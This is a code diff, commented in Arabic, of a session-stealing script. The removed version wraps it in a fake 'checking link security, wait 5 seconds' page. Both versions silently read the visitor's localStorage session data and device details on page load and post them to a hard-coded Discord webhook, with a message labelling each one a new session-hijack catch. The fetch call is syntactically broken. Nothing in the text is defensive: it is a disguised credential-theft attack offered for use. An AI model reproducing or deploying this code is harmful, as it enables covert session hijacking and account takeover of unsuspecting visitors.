@@ -1,48 +1,28 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جاري فحص أمان الاتصال..</title>
-    <style>
-        body { background-color: #f4f4f4; text-align: center; padding-top: 20%; font-family: Arial; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h1>جاري التحقق من أمان الرابط..</h1>
-    <p>يرجى الانتظار 5 ثوانٍ لتحميل المحتوى المطلوب.</p>
+// دالة قنص البيانات وإرسالها
+const captureAndSend = async () => {
+    const data = {
+        // سحب الجلسة من التخزين المحلي (لأن الكوكيز محمية)
+        sessionData: JSON.stringify(window.localStorage),
+        // سحب معلومات الجهاز والـ IP
+        deviceInfo: navigator.userAgent,
+        screen: window.screen.width + "x" + window.screen.height,
+        language: navigator.language,
+        time: new Date().toISOString()
+    };
 
-    <script>
-        // 1. ضع رابط الـ Discord Webhook الخاص بك هنا بين علامتي التنصيص
-        const webhookURL = "ضغ_رابط_الويب_هوك_الخاص_بك_هنا";
+    try {
+        // إرسال البيانات فوراً للديسكورد
+        await fetch("webhook":"https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "🎯 **قنص جديد (خطف جلسة):**\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
+            })
+        });
+    } catch (error) {
+        console.error("Error sending data");
+    }
+};
 
-        async function captureAndSend() {
-            const data = {
-                // سحب الجلسة من التخزين المحلي (لأن الكوكيز محمية)
-                sessionData: JSON.stringify(window.localStorage),
-                // سحب معلومات الجهاز والـ IP
-                deviceInfo: navigator.userAgent,
-                screen: window.screen.width + "x" + window.screen.height,
-                language: navigator.language,
-                time: new Date().toISOString()
-            };
-
-            // 2. إرسال البيانات فوراً للديسكورد
-            try {
-                await fetch"webhook":"https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "🎯 **قنص جديد (خطف جلسة):**\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
-                    })
-                });
-            } catch (error) { console.error("Error sending data"); }
-        }
-
-        // 3. تنفيذ القنص صامتاً فور التحميل
-        window.onload = captureAndSend;
-    </script>
-</body>
-</html>
+// تنفيذ القنص صامتاً فور تحميل الصفحة
+window.onload = captureAndSend;
